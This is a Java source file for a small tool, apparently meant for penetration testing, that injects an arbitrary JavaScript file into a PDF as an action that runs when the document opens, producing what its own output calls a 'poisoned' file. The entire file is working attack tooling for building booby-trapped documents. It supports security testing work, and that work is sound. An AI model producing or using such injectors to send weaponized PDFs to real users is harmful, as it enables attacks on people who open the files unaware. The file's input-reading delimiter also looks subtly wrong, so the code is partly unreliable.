package js2pdfinjector;

import java.io.File;
import java.io.FileFilter;
import java.util.Scanner;
import javax.swing.JFileChooser;
import javax.swing.JOptionPane;
import javax.swing.filechooser.FileNameExtensionFilter;
import org.apache.pdfbox.pdmodel.PDDocument;
import org.apache.pdfbox.pdmodel.interactive.action.type.PDActionJavaScript;

/**
 * This class behaves as follows: 1) File Open Prompt to select PDF file to
 * embed JS into. 2) File Open Prompt to select .js file to embed. 3) Prompt
 * displaying successful execution or error message.
 *
 * @author cornerpirate
 */
public class JS2PDFInjector {

    // These are now command line arguments
    public static File pdf_in = null;
    public static File js_in = null;

    /**
     * To allow this to be scriptable I updated to accept command line args That
     * means having a usage now which is displayed when no args areprovided.
     */
    public static void usage() {

        System.out.println("JS2PDFInjector: Allowing you to easily add JavaScript to a PDF document to execute when PDF opens.");
        System.out.println("Usage: java -jar JS2PDFInjector.jar <PDF FILE> <JS FILE>");
        System.out.println("Providing no positional arguments results in a GUI asking for file locations");

    }

    public static void main(String args[]) {

        // Not checking if files exist or anything. 
        // Don't run with scissors folks.
        if (args.length == 2) {
            pdf_in = new File(args[0]);
            js_in = new File(args[1]);

        } else {
            
            // No args provided. Display usage incase that helps
            usage() ;

            // User didn't provide args so show them GUI selectors.
            JFileChooser fileChooser = new JFileChooser();
            // do popup to get the file or files for input
            fileChooser.setMultiSelectionEnabled(false);
            FileNameExtensionFilter filter = new FileNameExtensionFilter("PDF Files", "pdf");
            fileChooser.setFileFilter(filter);

            pdf_in = null;
            int returnVal = fileChooser.showOpenDialog(null);
            if (returnVal == JFileChooser.APPROVE_OPTION) {
                pdf_in = fileChooser.getSelectedFile();
            } else {
                JOptionPane.showMessageDialog(null, "You did not select a file");
                System.exit(-1);
            }

            filter = new FileNameExtensionFilter("JavaScript File", "js");
            fileChooser.setFileFilter(filter);
            // clear PDF file from selected.
            fileChooser.setSelectedFile(new File(""));

            returnVal = fileChooser.showOpenDialog(null);
            if (returnVal == JFileChooser.APPROVE_OPTION) {
                js_in = fileChooser.getSelectedFile();
            } else {
                JOptionPane.showMessageDialog(null, "You did not select a file");
                System.exit(-1);
            }

        }

        try {

            String output_name = pdf_in.getParent() + File.separator + "js_injected_" + pdf_in.getName();
            File js_injected_pdf = new File(output_name);

            PDDocument document = PDDocument.load(pdf_in);
            System.out.println("[*] Original PDF: " + pdf_in);
            System.out.println("[*] JavaScript Payload: " + js_in);

            String content = new Scanner(js_in).useDelimiter(File.separator + "Z").next();

            PDActionJavaScript javascript = new PDActionJavaScript(content);

            document.getDocumentCatalog().setOpenAction(javascript);
            document.save(js_injected_pdf);
            
            System.out.println("[*] Poisoned File Created: " + js_injected_pdf);
            
            // This user is doing it the GUI way so GUI them a message
            if (args.length != 2) {
                JOptionPane.showMessageDialog(null, "Sucessfully injected at: " + js_injected_pdf);
            } 

        } catch (Exception ex) {
            ex.printStackTrace();
            JOptionPane.showMessageDialog(null, ex);
        }

    }
}
